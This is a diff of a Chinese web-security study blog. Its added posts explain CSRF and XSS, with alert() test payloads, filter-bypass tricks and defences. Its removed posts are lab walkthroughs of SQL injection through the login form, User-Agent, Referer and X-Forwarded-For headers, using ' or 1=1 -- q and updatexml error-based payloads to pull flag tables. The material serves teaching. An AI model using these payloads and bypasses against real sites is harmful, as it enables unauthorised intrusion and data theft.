+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF-跨站请求伪造"></a>CSRF-跨站请求伪造</h1><hr>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>跨站请求伪造（Cross-site request forgery） 通常简写为CSRF或者XSRF</p>
+<p>攻击者伪造一个请求（这个请求一般都是一个链接），然后欺骗目标用户进行点击，一旦用户点击了请求，整个攻击完成。故CSRF攻击也称为”on click” 攻击</p>
+<p>在目标用户登录账号的前提下，点击攻击者伪造的请求，可能造成用户密码被修改等等</p>
+<h2 id="CSRF与XSS区别"><a href="#CSRF与XSS区别" class="headerlink" title="CSRF与XSS区别"></a>CSRF与XSS区别</h2><p>CSRF是借助用户的权限完成的，攻击者并没有拿到用户的权限</p>
+<p>XSS是直接盗取用户的权限，然后实施破坏</p>
+<h1 id="防范CSRF"><a href="#防范CSRF" class="headerlink" title="防范CSRF"></a>防范CSRF</h1><h2 id="增加token验证"><a href="#增加token验证" class="headerlink" title="增加token验证"></a>增加token验证</h2><p>对关键操作增加token参数，token值必须足够随机，每次都不一样</p>
+<h2 id="安全的会话管理-避免会话被利用"><a href="#安全的会话管理-避免会话被利用" class="headerlink" title="安全的会话管理(避免会话被利用)"></a>安全的会话管理(避免会话被利用)</h2><p>不要在客户端保存敏感信息（比如身份认证信息）</p>
+<p>测试 直接关闭、退出时的会话过期机制</p>
+<p>设置会话过期机制，比如15分钟内无操作，则自动登录超时</p>
+<h2 id="访问控制安全管理"><a href="#访问控制安全管理" class="headerlink" title="访问控制安全管理"></a>访问控制安全管理</h2><p>敏感信息的修改时需要对身份进行二次认证，比如修改账号时，需要旧密码验证</p>
+<p>敏感信息的修改使用post，而不是get</p>
+<p>通过http头部中的referer来限制原页面</p>
+<h2 id="验证码防御"><a href="#验证码防御" class="headerlink" title="验证码防御"></a>验证码防御</h2><p>验证码防御被认为是对抗CSRF最为简单的而且有效的防御方法（需要考虑可用性）</p>
+<h2 id="Referer-Check防御"><a href="#Referer-Check防御" class="headerlink" title="Referer Check防御"></a>Referer Check防御</h2><p>Referer Check主要用于防止盗链，同理也可以用来检查请求是否来自合法的源</p>
+<p>缺陷：服务器并非任何时候都可以取得Referer,例如https 跳转到 http</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/27/XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/11/27/XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">XSS-跨站脚本攻击</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-27 11:32:09" itemprop="dateCreated datePublished" datetime="2022-11-27T11:32:09+08:00">2022-11-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-07 23:32:53" itemprop="dateModified" datetime="2023-03-07T23:32:53+08:00">2023-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS-跨站脚本攻击"></a>XSS-跨站脚本攻击</h1><hr>
+<h2 id="20XSS概述"><a href="#20XSS概述" class="headerlink" title="20XSS概述"></a>20XSS概述</h2><p>Cross Site Scripting – 跨站脚本攻击，为了和CSS层叠样式表区分，故称跨站脚本攻击为XSS</p>
+<p>跨站脚本攻击是指攻击者往Web页面里插入恶意Script代码，当用户浏览该页面之时，嵌入Web页面中的Script代码就会被执行，从而达到恶意攻击用户的目的</p>
+<p><strong>本质</strong></p>
+<p>用户输入的数据被当作代码代码执行</p>
+<p><strong>形成原因</strong></p>
+<p>主要原因是页面对输入和输出的控制不够严格，导致“精心构造的脚本代码”输入后，被浏览器当作有效代码解析执行从而产生危害</p>
+<p><strong>危害</strong></p>
+<p>盗取用户Cookie</p>
+<p>钓鱼攻击</p>
+<p>键盘记录</p>
+<p>截取网页屏幕</p>
+<p>获取内网ip</p>
+<p>获取浏览器保存的明文密码</p>
+<p>……</p>
+<p>注意：静态站点则完全不受其影响</p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>攻击者在 存在XSS漏洞的站点中，插入脚本代码</p>
+<p>用户访问该站点后，会触发攻击者插入的脚本代码，返回带有“恶意JS”的页面</p>
+<p>脚本代码执行，将用户的cookie数据，发送给攻击者</p>
+<p>攻击者利用cookie，伪造用户登录，造成破坏</p>
+<h2 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h2><p>反射型</p>
+<p>交互的数据一般不会被存放在数据库里面，一次性。一般出现在查询类页面等</p>
+<p>存储型</p>
+<p>交互的数据会被存在数据库中，一般出现在留言板、注册等页面</p>
+<p>DOM型</p>
+<p>不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题</p>
+<p>危害程度：存储型 &gt; 反射型 &gt; DOM型</p>
+<h2 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h2><p>在目标站点上找到输入点，如查询接口，留言板等</p>
+<p>输入一组 “特殊字符+唯一识别字符”，点击提交后，查看返回的源码，是否有做对应的处理</p>
+<p>通过搜索定位到唯一识别字符，结合唯一识别字符前后语法，确认是否可以构造执行JS的条件（闭合）</p>
+<p>提交构造的脚本代码(各种姿势)，看是否可以执行成功</p>
+<p>注意：</p>
+<p>一般查询接口容易出现反射型XSS，留言板容易出现存储型XSS</p>
+<p>由于后台可能存在过滤措施，构造的script可能会被过滤掉，而无法生效，或者环境限制了执行（浏览器）</p>
+<p>通过变化不同的script，尝试绕过后台过滤机制</p>
+<h2 id="JavaScript基础"><a href="#JavaScript基础" class="headerlink" title="JavaScript基础"></a>JavaScript基础</h2><p><strong>注释符</strong></p>
+<p>单行注释 &#x2F;&#x2F;</p>
+<p>多行注释 &#x2F;**&#x2F;</p>
+<p><strong>前端代码触发JavaScript脚本</strong></p>
+<p>1、直接使用script标签 </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2、伪协议: </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span> /&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3、事件型</p>
+<p>HTML事件：HTML 事件可以是浏览器或用户做的某些事情，当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件</p>
+<p>常见的HTML事件:</p>
 <table>
 <thead>
 <tr>
-<th>常见参数</th>
-<th>说明</th>
+<th>事件</th>
+<th>描述</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>User-Agent</td>
-<td>记录用户所使用的浏览器信息</td>
+<td>onchange</td>
+<td>HTML元素改变</td>
 </tr>
 <tr>
-<td>Accept</td>
-<td>指定客户端能够接收的内容类型</td>
+<td>onclick</td>
+<td>用户点击HTML元素</td>
 </tr>
 <tr>
-<td>Accept-Language</td>
-<td>浏览器可接受的语言</td>
+<td>onmouseover</td>
+<td>用户从一个html元素上移动鼠标</td>
 </tr>
 <tr>
-<td>Accept-Encoding</td>
-<td>指定浏览器可以支持的web服务器返回内容压缩编码类型</td>
+<td>onmouseout</td>
+<td>用户从一个HTML元素上移开鼠标</td>
 </tr>
 <tr>
-<td>Content-Type</td>
-<td>请求的与实体对应的MIME信息</td>
+<td>onkeydown</td>
+<td>用户按下键盘按键</td>
 </tr>
 <tr>
-<td>Content-Length</td>
-<td>请求的内容长度</td>
+<td>onload</td>
+<td>浏览器已完成页面的加载</td>
 </tr>
 <tr>
-<td>Connection</td>
-<td>表示是否需要持久连接</td>
+<td>onfocus</td>
+<td>元素获得焦点</td>
 </tr>
 <tr>
-<td>Referer</td>
-<td>先前网页的地址,从哪个网站访问过来的</td>
+<td>onerror</td>
+<td>当加载文档或图像时发送某个错误</td>
 </tr>
 <tr>
-<td>Cookie</td>
-<td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器</td>
-</tr>
-<tr>
-<td>Host</td>
-<td>指定请求的服务器的域名和端口号</td>
-</tr>
-<tr>
-<td>X-Forwarded-For</td>
-<td>用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</td>
+<td>oninput</td>
+<td>当用户输入时</td>
 </tr>
 </tbody></table>
-<h2 id="注入场景"><a href="#注入场景" class="headerlink" title="注入场景"></a>注入场景</h2><p>在一些网站中，用户登录后会记录用户的cookie、ip、UA、Referer等等<br>与数据库交互的位置就有可能存在注入点</p>
-<h2 id="User-Agent（UA）注入"><a href="#User-Agent（UA）注入" class="headerlink" title="User-Agent（UA）注入"></a>User-Agent（UA）注入</h2><p>1、进入靶场，发现是登录框，直接上万能密码 ‘ or 1 — q<br><img src="https://img-blog.csdnimg.cn/20210410163744837.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410163826303.png" alt="在这里插入图片描述"></p>
-<p>2、得到警告，’ 被限制，观察登录框没有验证码之类的限制，用暴力破解<br><img src="https://img-blog.csdnimg.cn/20210410163859817.png" alt="在这里插入图片描述"></p>
-<p>3.使用admin 密码为123456进行登录<br><img src="https://img-blog.csdnimg.cn/20210410163913392.png" alt="在这里插入图片描述"></p>
-<p>4、登录成功，打开源码，发现后台记录了我的UA，尝试UA处有没有注入<br><img src="https://img-blog.csdnimg.cn/20210410163930356.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410163937906.png" alt="在这里插入图片描述"><br>5、抓包后在UA处使用\进行探测<br><img src="https://img-blog.csdnimg.cn/20210410164111815.png" alt="在这里插入图片描述"><br>6、报错错误 to use near ‘admin’)’<br>可能UA与用户名进行了绑定记录，记录是插入语句，进行闭合，构造payload：<br>‘ and updatexml(1,concat(0x7e,version()),1),’admin’) — q<br><img src="https://img-blog.csdnimg.cn/2021041016405516.png" alt="**加粗样式**"><br>7、payload成功，5.0以上版本，可以使用information_schema数据库，爆出当前数据库中的第一个表名<br><img src="https://img-blog.csdnimg.cn/20210410164146549.png" alt="在这里插入图片描述"></p>
-<p>8、flag可能存在与flag_head表，故爆出flag_head表的字段名<br><img src="https://img-blog.csdnimg.cn/2021041016420314.png" alt="在这里插入图片描述"></p>
-<p>9、得出 flag_h1字段名，接着得出flag_h1字段中的信息<br><img src="https://img-blog.csdnimg.cn/20210410164218111.png" alt="在这里插入图片描述"></p>
-<h2 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h2><p>1、直接使用admin 123456进行登录<br><img src="https://img-blog.csdnimg.cn/20210410164317261.png" alt="在这里插入图片描述"></p>
-<p>2、打开源码，发现后台这次记录的是referer<br><img src="https://img-blog.csdnimg.cn/20210410164324366.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410164331113.png" alt="在这里插入图片描述"><br>3、抓包，对referer处 使用\进行探测<br><img src="https://img-blog.csdnimg.cn/20210410164409300.png" alt="在这里插入图片描述"><br>4、爆出错误，使用updatexml()函数进行报错注入，构造payload<br><img src="https://img-blog.csdnimg.cn/2021041016445430.png" alt="在这里插入图片描述"><br>5、爆出表名<br><img src="https://img-blog.csdnimg.cn/20210410164522458.png" alt="在这里插入图片描述"></p>
-<p>6、爆出flag_head表的字段名<br><img src="https://img-blog.csdnimg.cn/20210410164531404.png" alt="在这里插入图片描述"></p>
-<p>7、得出flag_h1字段的信息<br><img src="https://img-blog.csdnimg.cn/20210410164542107.png" alt="在这里插入图片描述"></p>
-<h2 id="IP注入"><a href="#IP注入" class="headerlink" title="IP注入"></a>IP注入</h2><p>1、使用admin 123456进行登录<br><img src="https://img-blog.csdnimg.cn/20210410164620700.png" alt="在这里插入图片描述"></p>
-<p>2、打开源码，发现这次记录的是IP地址<br><img src="https://img-blog.csdnimg.cn/20210410164629959.png" alt="在这里插入图片描述"></p>
-<p>3、思考：在HTTP请求中没有发现含有IP地址的位置，但是在对HTTP数据包抓包后可以自行添加删除<br>X-Forwarded-For(XFF) 是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段，也称为透明代理<br>故可以自行添加 X-Forwarded-For到HTTP请求头中<br><img src="https://img-blog.csdnimg.cn/20210410164648424.png" alt="在这里插入图片描述"></p>
-<p>4、直接构造payload<br><img src="https://img-blog.csdnimg.cn/20210410164658726.png" alt="在这里插入图片描述"></p>
-<p>5、其他操作步骤与以上操作相同，故直接爆出结果<br><img src="https://img-blog.csdnimg.cn/20210410164711428.png" alt="在这里插入图片描述"></p>
-<h2 id="cookie注入或者其他参数注入类似操作"><a href="#cookie注入或者其他参数注入类似操作" class="headerlink" title="cookie注入或者其他参数注入类似操作"></a>cookie注入或者其他参数注入类似操作</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>大部分在情况下，只有在登录的情况下，后台才会记录用户的ip、Referer等信息，故在进行header头注入之前需要有正确的账号密码进行登录</p>
-<p>注意：<br>报错注入函数除了updatexml()，extractvalue()函数也可以<br>extractvalue()函数语法：extractvalue(目标xml文档，xml路径)</p>
+<p>等等事件</p>
+<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/js/jsref_events.asp">https://www.w3school.com.cn/js/jsref_events.asp</a></p>
+<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>一次性，插入的脚本代码不会存储在数据库</p>
+<p>当用户 点击攻击者构造好的URL时，就会中招</p>
+<p><strong>出现场合</strong></p>
+<p>一般出现在查询框</p>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>与反射型XSS最大的不同就是攻击者输入的恶意脚本代码会存储到数据库中</p>
+<p>只要脚本代码在数据库中，用户浏览页面就会中招</p>
+<p><strong>出现场合</strong></p>
+<p>一般出现在留言板、注册等与数据库交互的地方</p>
+<p>“看见框就X”</p>
+<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>通过JavaScript，可以重构整个HTML文档，可以添加、移除、改变或重排页面上的项目</p>
+<p>要改变页面的某个东西，JavaScript就需要获得对HTML文档中的所有元素进行访问的入口。这个入口，连同对HTML元素进行添加、移动、改变或移除的方法和属性，都是通过文档对象模型来获得的（DOM）</p>
+<p>故DOM可以理解为一个一个访问HTML的编制编程接口</p>
+<p>注意：DOM型XSS 不与数据库进行交互</p>
+<p><em>HTML DOM 是关于如何获取、修改、添加或删除 HTML 元素的标准。</em></p>
+<h2 id="常见DOM方法与属性"><a href="#常见DOM方法与属性" class="headerlink" title="常见DOM方法与属性"></a>常见DOM方法与属性</h2><blockquote>
+<p>方法</p>
+</blockquote>
+<p>getElementById(id) — 获取带有指定id的节点元素</p>
+<p>document.lastModified—获取当前页面最后的修改时间（判断是否是伪静态页面）</p>
+<p>document.cookie—获取当前页面的cookie</p>
+<p>Document.write—向页面写入文本</p>
+<p>注意：document.write接受native编码</p>
+<p>native编码地址：<br><a target="_blank" rel="noopener" href="http://tool.oschina.net/encode?type=3">http://tool.oschina.net/encode?type=3</a></p>
+<blockquote>
+<p>属性</p>
+</blockquote>
+<p>innerHTML—节点的文本值</p>
+<p>parent—节点的父节点</p>
+<p>childNodes—节点的子节点</p>
+<p>attribute—节点的属性节点</p>
+<h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>有与前端数据交互的地方，比如：建议框</p>
+<p>相当于只有后台才能看到前端输入的内容，从前端无法判断是否存在XSS时，就可以采用盲打的形式</p>
+<p>盲打：不管3721，往里面插JS代码，然后等待，可能会有惊喜</p>
+<p>由于是后端，可能安全考虑不太严格，当管理员登录时，就会被被X</p>
+<h2 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h2><p>前端限制绕过：直接抓包重放，或者修改HTML前端代码</p>
+<p>大小写绕过：如 </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScRipT</span>&gt;</span>AlERt(1)<span class="tag">&lt;/<span class="name">ScrIPt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>拼凑绕过： 如 </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri<span class="tag">&lt;<span class="name">script</span>&gt;</span>pt&gt;alert(11)&lt;/scr<span class="tag">&lt;/<span class="name">script</span>&gt;</span>ipt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用注释进行干扰绕过：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>核心思路：后台过滤了特殊字符，比如：script 标签，但该标签可以被各种编码，后台不一定会过滤</p>
+<p>当浏览器对该编码进行识别时，会翻译成正常的标签，从而执行</p>
+<p>常见的编码：URL编码 HTML编码</p>
+<p><strong>注意</strong>：使用编码时，需要注意编码在输出点是否会被正常识别和翻译</p>
+<h2 id="htmlspecialchars-函数"><a href="#htmlspecialchars-函数" class="headerlink" title="htmlspecialchars()函数"></a>htmlspecialchars()函数</h2><p>htmlspecialchars()函数把预定义的字符转换为HTML实体</p>
+<p>预定义的字符是：</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&amp;(和号)</span>   <span class="literal">----</span>&gt;<span class="comment">&amp;amp</span></span><br><span class="line"><span class="comment">&quot;</span>    <span class="literal">----</span>&gt;<span class="comment">&amp;quot</span></span><br><span class="line"><span class="comment">&#x27;</span>   <span class="literal">----</span>&gt;<span class="comment">&amp;#039</span></span><br><span class="line">&lt;   <span class="literal">----</span>&gt;<span class="comment">&amp;lt</span></span><br><span class="line">&gt;   <span class="literal">----</span>&gt;<span class="comment">&amp;gt</span></span><br></pre></td></tr></table></figure>
+
+<p>用法：</p>
+<p>$ok &#x3D; htmlspecialchars($_GET[‘message’])</p>
+<p>可用的引号类型</p>
+<p>ENT-COMPAT–默认，仅编码双引号<br>ENT-QUOTES–编码双引号和单引号<br>ENT-NOQUOTES–不编码任何引号</p>
+<h2 id="XSS常见防范措施"><a href="#XSS常见防范措施" class="headerlink" title="XSS常见防范措施"></a>XSS常见防范措施</h2><p><strong>总的原则：输入做过滤，输出做转义</strong></p>
+<p>过滤：根据业务需求进行过滤</p>
+<p>转义：所有输出到前端的数据都要根据输出点做转义</p>
+<p><strong>a标签href做防范措施</strong></p>
+<p>a标签一般都是用来写一个超链接</p>
+<p>防范：只允许用户输入http或hppts开头的协议，其次在进行htmlspecialchars()处理</p>
 
       
     </div>
@@ -323,7 +888,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/14/SQL%E6%B3%A8%E5%85%A5-POST%E5%9E%8B/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/26/SQL%E6%B3%A8%E5%85%A5-Bypass/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/kilig.gif">
@@ -341,7 +906,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/11/14/SQL%E6%B3%A8%E5%85%A5-POST%E5%9E%8B/" class="post-title-link" itemprop="url">SQL注入-POST型</a>
+          <a href="/2022/11/26/SQL%E6%B3%A8%E5%85%A5-Bypass/" class="post-title-link" itemprop="url">SQL注入-Bypass</a>
         </h2>
 
         <div class="post-meta-container">
@@ -352,14 +917,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-11-14 16:25:06" itemprop="dateCreated datePublished" datetime="2022-11-14T16:25:06+08:00">2022-11-14</time>
+      <time title="创建时间：2022-11-26 11:31:35" itemprop="dateCreated datePublished" datetime="2022-11-26T11:31:35+08:00">2022-11-26</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 21:28:41" itemprop="dateModified" datetime="2023-03-07T21:28:41+08:00">2023-03-07</time>
+      <time title="修改时间：2023-03-07 18:56:57" itemprop="dateModified" datetime="2023-03-07T18:56:57+08:00">2023-03-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -381,914 +946,215 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="SQL注入-POST型"><a href="#SQL注入-POST型" class="headerlink" title="SQL注入-POST型"></a>SQL注入-POST型</h1><hr>
-<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>POST型注入与GET型注入操作上没有任何区别</p>
-<p>仅是HTTP的请求方式不同罢了</p>
-<p>GET型出现的注入类型，POST型都有可能出现</p>
-<h2 id="出现场景"><a href="#出现场景" class="headerlink" title="出现场景"></a>出现场景</h2><p>登录</p>
-<p>更改密码</p>
-<p>注册</p>
-<p>等敏感信息处一般都会使用post请求方式</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、登录框，一般情况下<br><img src="https://img-blog.csdnimg.cn/20210410155008673.png" alt="在这里插入图片描述"></p>
-<p>2、随便输入，打开burpsuite进行抓包<br>抓包数据包，发送到repeater模块<br><img src="https://img-blog.csdnimg.cn/20210410153559506.png" alt="在这里插入图片描述"></p>
-<p>3、使用\进行探测<br><img src="https://img-blog.csdnimg.cn/20210410153651134.png" alt="**加粗样式**"><br>产生报错信息<br><img src="https://img-blog.csdnimg.cn/20210410153732552.png" alt="在这里插入图片描述"></p>
-<p>4、猜想username传入的值会不会被单引号包裹，故可以进行构造闭合</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">-- q</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20210410155117143.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210410155129601.png" alt="在这里插入图片描述"></p>
-<p>‘ or 1&#x3D;1 – q 也称为万能密码<br><strong>原理：</strong><br>后端代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>Copy</p>
-<p>当username变量得到传参’ or 1&#x3D;1 – q</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;&#x27; or 1=1 -- q &#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>Copy</p>
-<p>前面的单引号闭合掉，or 1&#x3D;1 为真，– q注释掉后面的</p>
-<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>‘ or 1&#x3D;1 – q ，根据参数包裹方式不同，单引号可适当做变化</p>
-<p>5、猜测字段数<br><img src="https://img-blog.csdnimg.cn/2021041015521477.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210410155223850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>字段数为3</p>
-<p>6、使用联合查询，观察回显点<br><img src="https://img-blog.csdnimg.cn/2021041015531029.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>7、得到回显点2,3，查看版本号和当前数据库名<br><img src="https://img-blog.csdnimg.cn/20210410155328637.png" alt="在这里插入图片描述"><br>8、利用information_schema数据库得出数据<br>9、爆出当前数据库下的表名<br><img src="https://img-blog.csdnimg.cn/2021041015543268.png" alt="在这里插入图片描述"></p>
-<p>10、爆出表名flag，user，爆出flag表中的字段名<br><img src="https://img-blog.csdnimg.cn/20210410155542239.png" alt="在这里插入图片描述"><br>11、得到id、flag字段信息的值<br><img src="https://img-blog.csdnimg.cn/2021041015560744.png" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/12/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/kilig.gif">
-      <meta itemprop="name" content="kiligwh">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="kilig's Blog">
-      <meta itemprop="description" content="欢迎">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | kilig's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/11/12/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入-二次注入</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-11-12 18:21:27" itemprop="dateCreated datePublished" datetime="2022-11-12T18:21:27+08:00">2022-11-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 23:26:45" itemprop="dateModified" datetime="2023-03-07T23:26:45+08:00">2023-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
